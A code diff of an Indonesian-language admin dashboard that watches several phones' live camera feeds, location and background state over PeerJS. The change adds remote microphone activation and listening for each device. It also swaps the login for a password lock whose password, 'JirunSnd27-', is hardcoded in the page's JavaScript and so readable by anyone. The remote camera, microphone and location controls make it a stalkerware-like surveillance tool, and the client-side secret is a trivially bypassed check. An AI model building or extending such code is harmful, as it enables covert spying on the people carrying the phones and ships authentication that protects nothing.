@@ -3,70 +3,51 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Admin Multi-HP - Live Kamera & Lokasi</title>
+  <title>Admin Multi-HP - Live Kamera, Suara & Lokasi</title>
   <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', 'Segoe UI', sans-serif; }
     body { background: #0B1120; color: #F8FAFC; min-height: 100vh; padding: 18px; }
-    .container { max-width: 1380px; margin: 0 auto; }
 
-    /* Login Overlay */
-    .login-wrap {
-      min-height: calc(100vh - 36px);
+    /* Lock Screen */
+    .lock-screen {
+      position: fixed;
+      inset: 0;
+      z-index: 999;
+      background: radial-gradient(circle at top, #172554 0%, #0B1120 65%);
       display: flex;
       align-items: center;
       justify-content: center;
-      padding: 16px;
+      padding: 20px;
     }
-    .login-card {
+    .lock-screen.hidden { display: none; }
+    .lock-card {
       width: 100%;
-      max-width: 380px;
+      max-width: 370px;
       background: #111827;
       border: 1px solid #1F2937;
       border-radius: 16px;
       padding: 24px;
-      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.45);
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
     }
-    .login-card h2 { font-size: 18px; font-weight: 700; margin-bottom: 6px; }
-    .login-card p { font-size: 12px; color: #94A3B8; margin-bottom: 18px; }
-    .form-group { margin-bottom: 14px; }
-    .form-group label {
-      display: block;
-      font-size: 12px;
-      font-weight: 600;
-      color: #CBD5E1;
-      margin-bottom: 6px;
-    }
-    .form-group input {
+    .lock-card h2 { font-size: 18px; font-weight: 700; margin-bottom: 6px; }
+    .lock-card p { font-size: 12px; color: #94A3B8; margin-bottom: 16px; line-height: 1.45; }
+    .lock-input {
       width: 100%;
-      background: #0B1120;
+      background: #020617;
       border: 1px solid #334155;
+      color: #F8FAFC;
       border-radius: 8px;
       padding: 10px 12px;
-      color: #F8FAFC;
       font-size: 13px;
       outline: none;
-      transition: border-color 0.15s ease;
+      margin-bottom: 10px;
     }
-    .form-group input:focus { border-color: #118EE9; }
-    .login-error {
-      background: rgba(185, 28, 28, 0.2);
-      border: 1px solid rgba(248, 113, 113, 0.4);
-      color: #FCA5A5;
-      font-size: 12px;
-      padding: 8px 10px;
-      border-radius: 8px;
-      margin-bottom: 14px;
-      display: none;
-    }
-    .btn-login {
-      width: 100%;
-      padding: 10px 14px;
-      font-size: 13px;
-    }
+    .lock-input:focus { border-color: #118EE9; }
+    .lock-btn { width: 100%; padding: 10px 14px; font-size: 13px; }
+    .lock-error { color: #F87171; font-size: 11px; min-height: 16px; margin-bottom: 8px; }
 
-    /* Dashboard */
-    #dashboardWrap { display: none; }
+    .container { max-width: 1380px; margin: 0 auto; }
     .topbar {
       display: flex; justify-content: space-between; align-items: center;
       flex-wrap: wrap; gap: 12px; padding-bottom: 16px; margin-bottom: 18px;
@@ -84,15 +65,19 @@
     .btn-blue:hover { background: #0D7CD0; }
     .btn-indigo { background: #4F46E5; }
     .btn-indigo:hover { background: #4338CA; }
+    .btn-emerald { background: #059669; }
+    .btn-emerald:hover { background: #047857; }
+    .btn-amber { background: #D97706; }
+    .btn-amber:hover { background: #B45309; }
     .btn-slate { background: #334155; }
     .btn-slate:hover { background: #475569; }
-    .btn-red { background: #B91C1C; }
-    .btn-red:hover { background: #991B1B; }
+    .btn-red { background: #991B1B; }
+    .btn-red:hover { background: #B91C1C; }
     .btn-sm { padding: 6px 10px; font-size: 11px; border-radius: 6px; }
 
     .grid-devices {
       display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+      grid-template-columns: repeat(auto-fill, minmax(310px, 1fr));
       gap: 14px;
     }
     .device-card {
@@ -164,130 +149,101 @@
   </style>
 </head>
 <body>
-  <!-- Halaman Login Admin -->
-  <div id="loginWrap" class="login-wrap">
-    <form class="login-card" onsubmit="handleLogin(event)">
-      <h2>Login Admin Multi-HP</h2>
-      <p>Masukkan username dan password untuk mengakses panel pemantauan.</p>
-      <div id="loginError" class="login-error">Username atau password salah.</div>
-      <div class="form-group">
-        <label for="usernameInput">Username</label>
-        <input type="text" id="usernameInput" autocomplete="username" required />
-      </div>
-      <div class="form-group">
-        <label for="passwordInput">Password</label>
-        <input type="password" id="passwordInput" autocomplete="current-password" required />
-      </div>
-      <button type="submit" class="btn-blue btn-login">Masuk</button>
+  <div id="lockScreen" class="lock-screen">
+    <form class="lock-card" onsubmit="handleUnlock(event)">
+      <h2>Akses Panel Admin</h2>
+      <p>Masukkan password untuk membuka dashboard pantau kamera, suara & lokasi multi-HP.</p>
+      <input
+        id="passwordInput"
+        class="lock-input"
+        type="password"
+        placeholder="Masukkan password..."
+        autocomplete="current-password"
+        required
+      />
+      <div id="lockError" class="lock-error"></div>
+      <button type="submit" class="btn-blue lock-btn">Masuk Panel</button>
     </form>
   </div>
 
-  <!-- Halaman Dashboard Admin -->
-  <div id="dashboardWrap" class="container">
+  <div class="container">
     <div class="topbar">
       <div>
         <h1>Panel Pantau Multi-HP (<span id="onlineCount">0</span> Aktif)</h1>
-        <div class="sub" id="lobbyStatus">Menghubungkan ke Lobby Admin...</div>
+        <div class="sub" id="lobbyStatus">Terkunci • Menunggu verifikasi password...</div>
       </div>
       <div class="controls">
         <button class="btn-blue" onclick="connectAllDevices()">▶ Hubungkan Semua HP</button>
         <button class="btn-indigo" onclick="switchAllCameras('user')">🤳 Semua Depan</button>
         <button class="btn-indigo" onclick="switchAllCameras('environment')">📷 Semua Belakang</button>
-        <button class="btn-slate" onclick="setAllQuality('hd')">✨ Mode Jelas (HD)</button>
-        <button class="btn-slate" onclick="setAllQuality('smooth')">⚡ Mode Anti-Lag</button>
-        <button class="btn-slate" onclick="pingAllDevices()">🔄 Refresh Status</button>
-        <button class="btn-red" onclick="logoutAdmin()">🚪 Logout</button>
+        <button class="btn-emerald" onclick="requestMicAllDevices()">🎙️ Aktifkan Mic Semua</button>
+        <button class="btn-amber" onclick="muteAllAudio(false)">🔊 Unmute Semua</button>
+        <button class="btn-slate" onclick="muteAllAudio(true)">🔇 Mute Semua</button>
+        <button class="btn-slate" onclick="setAllQuality('hd')">✨ HD</button>
+        <button class="btn-slate" onclick="setAllQuality('smooth')">⚡ Smooth</button>
+        <button class="btn-slate" onclick="pingAllDevices()">🔄 Refresh</button>
+        <button class="btn-red" onclick="lockPanel()">🔒 Kunci</button>
       </div>
     </div>
 
     <div id="devicesGrid" class="grid-devices">
       <div id="emptyBox" class="empty-box" style="grid-column:1/-1;">
-        Menunggu perangkat member membuka halaman/APK dan mengizinkan lokasi serta kamera...
+        Menunggu perangkat member membuka halaman/APK dan mengizinkan lokasi, kamera & mikrofon...
       </div>
     </div>
   </div>
 
   <script>
-    const ADMIN_USER = "Jirun";
-    const ADMIN_PASS = "JirunSnd27-";
-    const AUTH_STORAGE_KEY = "jirun_admin_auth_v1";
-
     const ADMIN_LOBBY_ID = "jirun-admin-lobby-9988";
+    const ADMIN_PASSWORD = "JirunSnd27-";
+    const AUTH_STORAGE_KEY = "jirun_admin_unlocked_v1";
     const BACKGROUND_GRACE_MS = 30000;
 
     let peer = null;
-    let syncTimer = null;
     const devices = {};
 
-    function isAuthenticated() {
-      try {
-        const raw = localStorage.getItem(AUTH_STORAGE_KEY);
-        if (!raw) return false;
-        const parsed = JSON.parse(raw);
-        return parsed && parsed.loggedIn === true && parsed.user === ADMIN_USER;
-      } catch {
-        return false;
-      }
+    function isUnlocked() {
+      return sessionStorage.getItem(AUTH_STORAGE_KEY) === "1";
     }
 
-    function handleLogin(e) {
-      e.preventDefault();
-      const user = document.getElementById("usernameInput").value.trim();
-      const pass = document.getElementById("passwordInput").value;
-      const errEl = document.getElementById("loginError");
-
-      if (user === ADMIN_USER && pass === ADMIN_PASS) {
-        errEl.style.display = "none";
-        localStorage.setItem(AUTH_STORAGE_KEY, JSON.stringify({
-          loggedIn: true,
-          user: ADMIN_USER,
-          loginAt: Date.now()
-        }));
-        showDashboard();
+    function setUnlockedState(unlocked) {
+      const lockScreen = document.getElementById("lockScreen");
+      const input = document.getElementById("passwordInput");
+      const err = document.getElementById("lockError");
+      if (unlocked) {
+        sessionStorage.setItem(AUTH_STORAGE_KEY, "1");
+        lockScreen.classList.add("hidden");
+        err.textContent = "";
+        initAdminPeer();
       } else {
-        errEl.style.display = "block";
+        sessionStorage.removeItem(AUTH_STORAGE_KEY);
+        lockScreen.classList.remove("hidden");
+        input.value = "";
+        err.textContent = "";
+        setTimeout(() => input.focus(), 50);
       }
     }
 
-    function logoutAdmin() {
-      localStorage.removeItem(AUTH_STORAGE_KEY);
-      if (syncTimer) {
-        clearInterval(syncTimer);
-        syncTimer = null;
+    function handleUnlock(event) {
+      event.preventDefault();
+      const input = document.getElementById("passwordInput");
+      const err = document.getElementById("lockError");
+      if (input.value === ADMIN_PASSWORD) {
+        setUnlockedState(true);
+      } else {
+        err.textContent = "Password salah. Silakan coba lagi.";
+        input.select();
       }
-      if (peer && !peer.destroyed) {
-        peer.destroy();
-      }
-      peer = null;
-
-      for (const id of Object.keys(devices)) {
-        delete devices[id];
-      }
-
-      document.getElementById("devicesGrid").innerHTML = `
-        <div id="emptyBox" class="empty-box" style="grid-column:1/-1;">
-          Menunggu perangkat member membuka halaman/APK dan mengizinkan lokasi serta kamera...
-        </div>
-      `;
-      document.getElementById("onlineCount").textContent = "0";
-      document.getElementById("lobbyStatus").textContent = "Menghubungkan ke Lobby Admin...";
-      document.getElementById("usernameInput").value = "";
-      document.getElementById("passwordInput").value = "";
-      document.getElementById("dashboardWrap").style.display = "none";
-      document.getElementById("loginWrap").style.display = "flex";
     }
 
-    function showDashboard() {
-      document.getElementById("loginWrap").style.display = "none";
-      document.getElementById("dashboardWrap").style.display = "block";
-      initAdminPeer();
-      if (!syncTimer) {
-        syncTimer = setInterval(syncAllCards, 2000);
-      }
+    function lockPanel() {
+      muteAllAudio(true);
+      setUnlockedState(false);
     }
 
     function initAdminPeer() {
-      if (peer && !peer.destroyed) return;
+      if (!isUnlocked() || peer) return;
+      document.getElementById("lobbyStatus").textContent = "Menghubungkan ke Lobby Admin...";
       peer = new Peer(ADMIN_LOBBY_ID);
 
       peer.on("open", () => {
@@ -304,7 +260,7 @@
         syncDeviceCard(id);
 
         conn.on("open", () => {
-          conn.send({ type: "REQUEST_STREAM", quality: entry.quality || "hd" });
+          conn.send({ type: "REQUEST_STREAM", quality: entry.quality || "hd", enableMic: true });
         });
 
         conn.on("data", (msg) => {
@@ -324,6 +280,7 @@
             entry.inBackground = Boolean(msg.inBackground);
             entry.facing = msg.facing || entry.facing || "Depan";
             entry.cameraOn = msg.cameraOn !== undefined ? Boolean(msg.cameraOn) : true;
+            entry.micOn = Boolean(msg.micOn);
             entry.location = msg.location || entry.location;
             entry.device = msg.device || entry.device;
             entry.connected = true;
@@ -353,6 +310,7 @@
         call.on("stream", (remoteStream) => {
           entry.closedExplicitly = false;
           entry.stream = remoteStream;
+          entry.micOn = remoteStream.getAudioTracks().some((t) => t.readyState === "live" && t.enabled);
           entry.connected = true;
           entry.updatedAt = Date.now();
           attachStreamToCard(id, remoteStream);
@@ -365,9 +323,7 @@
       });
 
       peer.on("disconnected", () => {
-        if (peer && !peer.destroyed && isAuthenticated()) {
-          peer.reconnect();
-        }
+        if (peer && !peer.destroyed) peer.reconnect();
       });
     }
 
@@ -377,6 +333,8 @@
           peerId: id,
           facing: "Depan",
           cameraOn: true,
+          micOn: false,
+          audioMuted: true,
           inBackground: false,
           location: null,
           device: "",
@@ -392,17 +350,65 @@
       return devices[id];
     }
 
-    function requestStreamFromDevice(id) {
+    function requestStreamFromDevice(id, enableMic = true) {
       const entry = devices[id];
       if (!entry || !peer || peer.destroyed) return;
       if (entry.conn && entry.conn.open) {
-        entry.conn.send({ type: "REQUEST_STREAM", quality: entry.quality || "hd" });
+        entry.conn.send({ type: "REQUEST_STREAM", quality: entry.quality || "hd", enableMic });
+      }
+    }
+
+    function requestMicForDevice(id) {
+      const entry = devices[id];
+      if (!entry) return;
+      entry.audioMuted = false;
+      if (entry.conn && entry.conn.open) {
+        entry.conn.send({ type: "ENABLE_MIC" });
+      }
+      applyCardAudioMute(id, false);
+      syncDeviceCard(id);
+    }
+
+    function requestMicAllDevices() {
+      for (const id of Object.keys(devices)) {
+        requestMicForDevice(id);
+      }
+    }
+
+    function toggleDeviceAudioMute(id) {
+      const entry = devices[id];
+      if (!entry) return;
+      const nextMuted = !entry.audioMuted;
+      if (!nextMuted && entry.conn && entry.conn.open) {
+        entry.conn.send({ type: "ENABLE_MIC" });
+      }
+      applyCardAudioMute(id, nextMuted);
+      syncDeviceCard(id);
+    }
+
+    function applyCardAudioMute(id, muted) {
+      const entry = devices[id];
+      if (entry) entry.audioMuted = Boolean(muted);
+      const vid = document.getElementById(`vid_${id}`);
+      if (vid) {
+        vid.muted = Boolean(muted);
+        vid.volume = muted ? 0 : 1;
+        if (!muted) {
+          vid.play().catch(() => {});
+        }
+      }
+    }
+
+    function muteAllAudio(muted) {
+      for (const id of Object.keys(devices)) {
+        applyCardAudioMute(id, muted);
+        syncDeviceCard(id);
       }
     }
 
     function connectAllDevices() {
       for (const id of Object.keys(devices)) {
-        requestStreamFromDevice(id);
+        requestStreamFromDevice(id, true);
       }
     }
 
@@ -410,7 +416,7 @@
       const entry = devices[id];
       if (entry && entry.conn && entry.conn.open) {
         entry.facing = facing === "environment" ? "Belakang" : "Depan";
-        entry.conn.send({ type: "SWITCH_CAM", facing, quality: entry.quality || "hd" });
+        entry.conn.send({ type: "SWITCH_CAM", facing, quality: entry.quality || "hd", enableMic: true });
         syncDeviceCard(id);
       }
     }
@@ -447,6 +453,7 @@
     }
 
     function attachStreamToCard(id, stream) {
+      const entry = devices[id];
       const vid = document.getElementById(`vid_${id}`);
       const ph = document.getElementById(`ph_${id}`);
       if (!vid || !ph) return;
@@ -455,6 +462,9 @@
         if (vid.srcObject !== stream) {
           vid.srcObject = stream;
         }
+        const shouldMute = entry ? Boolean(entry.audioMuted) : true;
+        vid.muted = shouldMute;
+        vid.volume = shouldMute ? 0 : 1;
         vid.style.display = "block";
         ph.style.display = "none";
         if (vid.paused) {
@@ -492,14 +502,17 @@
         </div>
         <div class="card-body">
           <div class="device-id">${safeId}</div>
+          <div class="meta-line" id="mic_${safeId}">🎙️ Mic: Mengecek...</div>
           <div class="meta-line" id="loc_${safeId}">📍 Menunggu koordinat akurat...</div>
           <div class="meta-line" id="dev_${safeId}">📱 Perangkat</div>
           <div class="card-actions" id="act_${safeId}">
             <button class="btn-indigo btn-sm" onclick="switchDeviceCamera('${safeId}', 'user')">Depan</button>
             <button class="btn-indigo btn-sm" onclick="switchDeviceCamera('${safeId}', 'environment')">Belakang</button>
+            <button class="btn-emerald btn-sm" id="btnMic_${safeId}" onclick="requestMicForDevice('${safeId}')">🎙️ Minta Mic</button>
+            <button class="btn-amber btn-sm" id="btnAudio_${safeId}" onclick="toggleDeviceAudioMute('${safeId}')">🔇 Unmute</button>
             <button class="btn-slate btn-sm" onclick="setDeviceQuality('${safeId}', 'hd')">HD</button>
             <button class="btn-slate btn-sm" onclick="setDeviceQuality('${safeId}', 'smooth')">Smooth</button>
-            <button class="btn-blue btn-sm" onclick="requestStreamFromDevice('${safeId}')">Stream</button>
+            <button class="btn-blue btn-sm" onclick="requestStreamFromDevice('${safeId}', true)">Stream</button>
           </div>
         </div>
       `;
@@ -563,6 +576,17 @@
         }
       }
 
+      const micEl = document.getElementById(`mic_${id}`);
+      const btnAudio = document.getElementById(`btnAudio_${id}`);
+      if (micEl) {
+        const micLabel = d.micOn ? "Mic HP Aktif" : "Mic HP Belum Aktif";
+        const listenLabel = d.audioMuted ? "Suara Admin: Mute" : "Suara Admin: Terdengar";
+        micEl.textContent = `🎙️ ${micLabel} • ${listenLabel}`;
+      }
+      if (btnAudio) {
+        btnAudio.textContent = d.audioMuted ? "🔇 Unmute" : "🔊 Mute";
+      }
+
       const loc = d.location;
       const hasCoords = loc && typeof loc.lat === "number" && typeof loc.lng === "number";
       const locEl = document.getElementById(`loc_${id}`);
@@ -609,12 +633,12 @@
     }
 
     window.addEventListener("DOMContentLoaded", () => {
-      if (isAuthenticated()) {
-        showDashboard();
+      if (isUnlocked()) {
+        setUnlockedState(true);
       } else {
-        document.getElementById("loginWrap").style.display = "flex";
-        document.getElementById("dashboardWrap").style.display = "none";
+        setTimeout(() => document.getElementById("passwordInput").focus(), 50);
       }
+      setInterval(syncAllCards, 2000);
     });
   </script>
 </body>
